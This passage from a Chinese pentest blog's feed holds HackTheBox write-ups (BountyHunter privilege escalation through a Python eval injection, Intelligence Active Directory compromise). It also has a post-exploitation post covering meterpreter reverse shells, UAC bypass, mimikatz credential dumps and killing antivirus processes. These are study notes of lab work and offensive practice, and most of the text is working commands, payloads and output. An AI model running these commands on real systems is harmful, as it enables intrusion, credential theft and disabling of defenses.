team,</span><br><span class="line"></span><br><span class="line">I&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.</span><br><span class="line"></span><br><span class="line">This has been our first job since the &quot;rm -rf&quot; incident and we can&#39;t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.</span><br><span class="line"></span><br><span class="line">I set up the permissions for you to test this. Good luck.</span><br><span class="line"></span><br><span class="line">-- John</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for development on bountyhunter:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User development may run the following commands on bountyhunter:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;python3.8 &#x2F;opt&#x2F;skytrain_inc&#x2F;ticketValidator.py</span><br></pre></td></tr></table></figure><p>查看py文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;opt&#x2F;skytrain_inc&#x2F;ticketValidator.py</span><br><span class="line">#Skytrain Inc Ticket Validation System 0.1</span><br><span class="line">#Do not distribute this file.</span><br><span class="line"></span><br><span class="line">def load_file(loc):</span><br><span class="line">    if loc.endswith(&quot;.md&quot;):</span><br><span class="line">        return open(loc, &#39;r&#39;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Wrong file type.&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">def evaluate(ticketFile):</span><br><span class="line">    #Evaluates a ticket to check for ireggularities.</span><br><span class="line">    code_line &#x3D; None</span><br><span class="line">    for i,x in enumerate(ticketFile.readlines()):</span><br><span class="line">        if i &#x3D;&#x3D; 0:</span><br><span class="line">            if not x.startswith(&quot;# Skytrain Inc&quot;):</span><br><span class="line">                return False</span><br><span class="line">            continue</span><br><span class="line">        if i &#x3D;&#x3D; 1:</span><br><span class="line">            if not x.startswith(&quot;## Ticket to &quot;):</span><br><span class="line">                return False</span><br><span class="line">            print(f&quot;Destination: &#123;&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])&#125;&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        if x.startswith(&quot;__Ticket Code:__&quot;):</span><br><span class="line">            code_line &#x3D; i+1</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        if code_line and i &#x3D;&#x3D; code_line:</span><br><span class="line">            if not x.startswith(&quot;**&quot;):</span><br><span class="line">                return False</span><br><span class="line">            ticketCode &#x3D; x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0]</span><br><span class="line">            if int(ticketCode) % 7 &#x3D;&#x3D; 4:</span><br><span class="line">                validationNumber &#x3D; eval(x.replace(&quot;**&quot;, &quot;&quot;))</span><br><span class="line">                if validationNumber &gt; 100:</span><br><span class="line">                    return True</span><br><span class="line">                else:</span><br><span class="line">                    return False</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    fileName &#x3D; input(&quot;Please enter the path to the ticket file.\n&quot;)</span><br><span class="line">    ticket &#x3D; load_file(fileName)</span><br><span class="line">    #DEBUG print(ticket)</span><br><span class="line">    result &#x3D; evaluate(ticket)</span><br><span class="line">    if (result):</span><br><span class="line">        print(&quot;Valid ticket.&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Invalid ticket.&quot;)</span><br><span class="line">    ticket.close</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>eval()可以进行执行命令</p><p>构造恶意文本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;tmp&#x2F;1.md</span><br><span class="line"></span><br><span class="line"># Skytrain Inc</span><br><span class="line">## Ticket to Bridgeport</span><br><span class="line">__Ticket Code:__</span><br><span class="line">**11+eval(&quot;__import__(&#39;os&#39;).system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;)**</span><br><span class="line">##Issued: 2021&#x2F;06&#x2F;21</span><br><span class="line">#End Ticket</span><br></pre></td></tr></table></figure><p>提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;python3.8 &#x2F;opt&#x2F;skytrain_inc&#x2F;ticketValidator.py</span><br><span class="line">&#x2F;tmp&#x2F;1.md</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br><span class="line"></span><br><span class="line">d8b513ba7130a46641d2c65966f6b8e6</span><br></pre></td></tr></table></figure><hr /><h1 id="intelligence"><a class="markdownIt-Anchor" href="#intelligence"></a> Intelligence</h1><h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.248</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.10.248</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 988 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53&#x2F;tcp   open  domain        Simple DNS Plus</span><br><span class="line">80&#x2F;tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-18 12:54:48Z)</span><br><span class="line">135&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds?</span><br><span class="line">464&#x2F;tcp  open  kpasswd5?</span><br><span class="line">593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp  open  ssl&#x2F;ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp open  ssl&#x2F;ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2><p>访问80端口，可以看到主页上有两个PDF的链接</p><p>尝试枚举其他PDF</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pdf.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">            year = <span class="built_in">str</span>(<span class="number">2020</span> + i)</span><br><span class="line">            month = (<span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(j)) <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(j)) == <span class="number">1</span> <span class="keyword">else</span> <span class="built_in">str</span>(j)</span><br><span class="line">            day = (<span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(k)) <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(k)) == <span class="number">1</span> <span class="keyword">else</span> <span class="built_in">str</span>(k)</span><br><span class="line">            url = <span class="string">&quot;http://10.10.10.248/documents/&quot;</span> + year + <span class="string">&quot;-&quot;</span> + month + <span class="string">&quot;-&quot;</span> + day + <span class="string">&quot;-upload.pdf&quot;</span></span><br><span class="line">            res = req.get(url)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                filename = year + <span class="string">&quot;-&quot;</span> + month + <span class="string">&quot;-&quot;</span> + day + <span class="string">&quot;-upload.pdf&quot;</span></span><br><span class="line">                print(filename)</span><br><span class="line">                file = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">                file.write(res.content)</span><br></pre></td></tr></table></figure><p>获取PDF的用户名</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pdf.sh</span></span><br><span class="line">filelist=`ls *.pdf`</span><br><span class="line">filenum=`ls *.pdf|wc -l`</span><br><span class="line"><span class="keyword">for</span> ((i=1;i&lt;=<span class="variable">$filenum</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    filename[<span class="variable">$&#123;i&#125;</span>]=`ls *.pdf| sed -n <span class="variable">$&#123;i&#125;</span>p`</span><br><span class="line">    <span class="built_in">echo</span> `exiftool <span class="variable">$&#123;filename[<span class="variable">$&#123;i&#125;</span>]&#125;</span> | grep Creator | awk -F \  <span class="string">&#x27;&#123;print \$3&#125;&#x27;</span>` &gt;&gt; user</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>从2020-06-04-upload.pdf中得到一个密码<code>NewIntelligenceCorpUser9876</code></p><p>爆破SMB</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.248 -d intelligence -u user -p NewIntelligenceCorpUser9876</span><br><span class="line"></span><br><span class="line">SMB         10.10.10.248    445    DC               [+] intelligence\Tiffany.Molina:NewIntelligenceCorpUser9876</span><br></pre></td></tr></table></figure><p>查看SMB路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence</span><br><span class="line"></span><br><span class="line">    Disk                                                    Permissions Comment</span><br><span class="line">    ----                                                    ----------- -------</span><br><span class="line">    ADMIN$                                              NO ACCESS   Remote Admin</span><br><span class="line">    C$                                                  NO ACCESS   Default share</span><br><span class="line">    IPC$                                                READ ONLY   Remote IPC</span><br><span class="line">    IT                                                  READ ONLY   </span><br><span class="line">    NETLOGON                                            READ ONLY   Logon server share </span><br><span class="line">    SYSVOL                                              READ ONLY   Logon server share </span><br><span class="line">    Users                                               READ ONLY</span><br></pre></td></tr></table></figure><p>获得user.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;10.10.10.248&#x2F;users -U Tiffany.Molina NewIntelligenceCorpUser9876</span><br><span class="line">cd Tiffany.Molina\Desktop\</span><br><span class="line">get user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br><span class="line"></span><br><span class="line">bbfd0948d53d769c6ec2fcc02181fa7b</span><br></pre></td></tr></table></figure><h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2><p>获取powershell脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;10.10.10.248&#x2F;IT -U Tiffany.Molina NewIntelligenceCorpUser9876</span><br><span class="line">get downdetector.ps1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat downdetector.ps1</span><br><span class="line"></span><br><span class="line"># Check web server status. Scheduled to run every 5min</span><br><span class="line">Import-Module ActiveDirectory </span><br><span class="line">foreach($record in Get-ChildItem &quot;AD:DC&#x3D;intelligence.htb,CN&#x3D;MicrosoftDNS,DC&#x3D;DomainDnsZones,DC&#x3D;intelligence,DC&#x3D;htb&quot; | Where-Object Name -like &quot;web*&quot;)  &#123;</span><br><span class="line">try &#123;</span><br><span class="line">$request &#x3D; Invoke-WebRequest -Uri &quot;http:&#x2F;&#x2F;$($record.Name)&quot; -UseDefaultCredentials</span><br><span class="line">if(.StatusCode -ne 200) &#123;</span><br><span class="line">Send-MailMessage -From &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -To &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125; catch &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;dirkjanm&#x2F;krbrelayx&#x2F;master&#x2F;dnstool.py</span><br><span class="line">python3 dnstool.py -u &quot;intelligence.htb\Tiffany.Molina&quot; -p NewIntelligenceCorpUser9876 --action add -r webbufferfly.intelligence.htb -d 10.10.16.24 10.10.10.248</span><br></pre></td></tr></table></figure><p>获取账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br><span class="line"></span><br><span class="line">Ted.Graves::intelligence:a0ccbece497d44d6:5F06EFF458D65EF3D277BBEF99522C05:01010000000000006E002FBCEB7ED70155A10145AE3210F90000000002000800320041004400530001001E00570049004E002D00490056004200580046004E00320037003300340045000400140032004100440053002E004C004F00430041004C0003003400570049004E002D00490056004200580046004E00320037003300340045002E0032004100440053002E004C004F00430041004C000500140032004100440053002E004C004F00430041004C000800300030000000000000000000000000200000A9E570CA9FC3E890033A04EB61C9D3A383AF9C961FCC3E1B59979F2C02378B410A0010000000000000000000000000000000000009003E0048005400540050002F007700650062003100310034003500310034002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000</span><br></pre></td></tr></table></figure><p>爆破Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash</span><br><span class="line"></span><br><span class="line">Mr.Teddy         (Ted.Graves)</span><br></pre></td></tr></table></figure><p>获得凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ted.Graves:Mr.Teddy</span><br></pre></td></tr></table></figure><p>获取Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;micahvandeusen&#x2F;gMSADumper&#x2F;main&#x2F;gMSADumper.py</span><br><span class="line">python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248</span><br><span class="line"></span><br><span class="line">svc_int$:::47e89a6afd68e3872ef1acaf91d0b2f7</span><br></pre></td></tr></table></figure><p>获取SPN</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;the-useless-one&#x2F;pywerview</span><br><span class="line">python3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-data</span><br><span class="line"></span><br><span class="line">msds-allowedtodelegateto:       WWW&#x2F;dc.intelligence.htb</span><br></pre></td></tr></table></figure><p>获取ST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py intelligence.htb&#x2F;svc_int$ -spn WWW&#x2F;dc.intelligence.htb -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate administrator</span><br><span class="line">export KRB5CCNAME&#x3D;administrator.ccache</span><br><span class="line">python3 secretsdump.py -k dc.intelligence.htb -just-dc</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::</span><br></pre></td></tr></table></figure><p>Hash登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.248 -u administrator -H 9075113fe16cf74f7c0f9b27e882dad3</span><br><span class="line">type c:\users\administrator\desktop\root.txt</span><br><span class="line"></span><br><span class="line">0c6b9779d283e244e79b11c78fc1fb92</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;随缘更新&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
    <category term="Windows" scheme="https://yoloyolo.top/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Post Pentest 101</title>
    <link href="https://yoloyolo.top/2021/08/22/Post-Pentest-101/"/>
    <id>https://yoloyolo.top/2021/08/22/Post-Pentest-101/</id>
    <published>2021-08-23T02:26:51.000Z</published>
    <updated>2022-05-14T16:05:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些后渗透的操作<br />10/69的马过一周变20/68了，今天丢虚拟机直接报毒，看来免杀上还得多学学</p><a id="more"></a><p>获得了meterpreter会话之后的操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ps | grep 360</span><br><span class="line">PID   PPID  Name              Arch  Session  User  Path</span><br><span class="line">---   ----  ----              ----  -------  ----  ----</span><br><span class="line">1104  1672  360Tray.exe       x86   1</span><br><span class="line">6272  1104  360Safe.exe       x86   1</span><br><span class="line">6380  6272  360leakfixer.exe  x86   1</span><br><span class="line">ps | grep Hips</span><br><span class="line">PID   PPID  Name            Arch  Session  User                  Path</span><br><span class="line">---   ----  ----            ----  -------  ----                  ----</span><br><span class="line">1152  188   HipsTray.exe    x86   1</span><br><span class="line">5268  6172  HipsMain.exe    x86   1        DESKTOP-653VJP2\Kira  C:\Program Files (x86)\Huorong\Sysdiag\bin\HipsMain.exe</span><br><span class="line">5444  624   HipsDaemon.exe</span><br></pre></td></tr></table></figure><p>将进程迁移到资源浏览器中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps | grep explorer</span><br><span class="line">3936  4916  explorer.exe  x64   1        DESKTOP-653VJP2\Kira  C:\Windows\explorer.exe</span><br><span class="line">migrate 3936</span><br></pre></td></tr></table></figure><p>这里有一点需要注意，如果meterpreter在bypassuac之后获得了高权限，但是继续向低权限的进程迁移的话，会被降权</p><p>使用bypassuac获得Administrator的权限(火绒稳定拦，确切来说是直接把上传的程序给删了，360有时候会拦)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.56.103</span><br><span class="line">set LPORT 9876</span><br><span class="line">set target 1</span><br><span class="line">set session 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>因为系统版本问题，不能用&quot;bypassuac&quot;，只能用&quot;bypassuac_injection&quot;，所以会莫名其妙地触发了个&quot;SQL Client Configuration Utility EXE&quot;的UAC，然后导致了MSF那边收不到session<br />另一台电脑上试的时候用的是&quot;bypassuac&quot;，倒没问题</p><p>这里需要注意一点<br />target参数需要与目标机器上的操作系统相对应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show target</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line">   1   Windows x64</span><br></pre></td></tr></table></figure><p>使用mimikatz模块导出Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use kiwi</span><br><span class="line">kiwi_cmd privilege::debug</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>得到Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 396268 (00000000:00060bec)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : Kira</span><br><span class="line">Domain            : DESKTOP-653VJP2</span><br><span class="line">Logon Server      : DESKTOP-653VJP2</span><br><span class="line">Logon Time        : 2021&#x2F;8&#x2F;22 17:27:49</span><br><span class="line">SID               : S-1-5-21-413531007-3663720574-771213360-1001</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Kira</span><br><span class="line"> * Domain   : DESKTOP-653VJP2</span><br><span class="line"> * NTLM     : 38uZAEr4UA7uUYqgCEsBEDJJRsnnsZ2dUt</span><br><span class="line"> * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Kira</span><br><span class="line"> * Domain   : DESKTOP-653VJP2</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Kira</span><br><span class="line"> * Domain   : DESKTOP-653VJP2</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><p>NTLM的加密算法为MD4，爆破起来不算复杂<br />这里密码是123456<br />拿了密码基本就可以rdp登入上去操作(关杀软)了</p><p>管理员权限下taskkill只能关掉360Safe，不能关掉360Tray与ZhuDongFangYu</p><p>之后可以使用backstab来干掉&quot;ZhuDongFangYu.exe&quot;进程<br />在新装的虚拟机上运行提示缺少下面两个dll<br />VCRUNTIME140D.dll<br />ucrtbased.dll<br />64位系统上，64位dll路径为&quot;C:\Windows\System32&quot;，32位dll路径为&quot;C:\Windows\SysWOW64&quot;<br />如果实战跑不了这玩意，估计得用screenshot看看是什么情况</p><p>拿这玩意杀不掉360Tray，反而一个开始占CPU一个开始占内存<br />估计是360在竞争生成进程，Backstab没有做内存释放的机制<br />最后导致虚拟机卡死<br />明天换台机器试试</p><hr /><p>公司机器上开虚拟机关360主程序的时候360Tray会自动退出，然后就能干&quot;ZhuDongFangYu.exe&quot;<br />就很玄学</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些后渗透的操作&lt;br /&gt;
10/69的马过一周变20/68了，今天丢虚拟机直接报毒，看来免杀上还得多学学&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Windows" scheme="https://yoloyolo.top/tags/Windows/"/>
    
    <category term="Post_Pentest" scheme="https://yoloyolo.top/tags/Post-Pentest/"/>
    
  </entry>
  
  <entry>
    <title>Log of Anti-AntiVirus</title>
    <link href="https://yoloyolo.top/2021/08/08/Log-of-Anti-AntiVirus/"/>
    <id>https://yoloyolo.top/2021/08/08/Log-of-Anti-AntiVirus/</id>
    <published>2021-08-08T06:08:58.000Z</published>
    <updated>2022-06-10T16:45:30.000Z</updated>
    
